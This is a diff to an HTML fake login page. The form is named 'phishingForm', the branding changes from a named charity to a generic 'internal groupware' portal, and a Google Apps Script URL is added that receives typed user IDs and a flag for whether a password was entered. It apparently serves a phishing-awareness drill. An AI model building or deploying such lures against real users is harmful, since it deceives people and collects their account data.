@@ -7,8 +7,14 @@
     <style>
         body { 
             font-family: 'Malgun Gothic', sans-serif; 
-            display: flex; justify-content: center; align-items: center; 
-            height: 100vh; background-color: #ffffff; margin: 0; 
+            display: flex; 
+            justify-content: center; 
+            align-items: flex-start; /* 중앙 정렬 해제하고 위쪽 기준으로 설정 */
+            padding-top: 20vh; /* 화면 전체 높이의 20% 지점 (8부 능선 위치) */
+            min-height: 100vh; 
+            background-color: #ffffff; 
+            margin: 0; 
+            box-sizing: border-box;
         }
         .login-container {
             width: 380px;
@@ -23,7 +29,7 @@
             font-weight: bold;
             color: #333;
         }
-        /* 입력창 디자인 (형이 보여준 이미지 참고) */
+        /* 입력창 디자인 */
         input[type="text"], input[type="password"] { 
             width: 100%; 
             padding: 14px; 
@@ -61,7 +67,7 @@
     <div class="login-container">
         
         <div class="logo-area">
-            [ 굿네이버스 ]
+            [ 사내 그룹웨어 ]
         </div>
         
         <form id="phishingForm">
@@ -83,8 +89,8 @@
             var userPw = document.getElementById('userPw').value;
             var isPwEntered = userPw.length > 0 ? 'O' : 'X';
             
-            // ★ 전에 발급받은 구글 앱스 스크립트 웹 앱 URL을 여기에 넣어줘 ★
-            var gasUrl = '여기에_웹_앱_URL을_붙여넣으세요';
+            // ★ 전에 발급받은 구글 앱스 스크립트 웹 앱 URL을 반드시 여기에 다시 넣어줘! ★
+            var gasUrl = 'https://script.google.com/macros/s/AKfycbxx3xoV30Fq8UB4bCDtSLXRwsWkFOEjt-fm2cw9w7mqufJCTN6THnQCUnBRhhwgAHAgKA/exec';
 
             var formData = new FormData();
             formData.append('userId', userId);
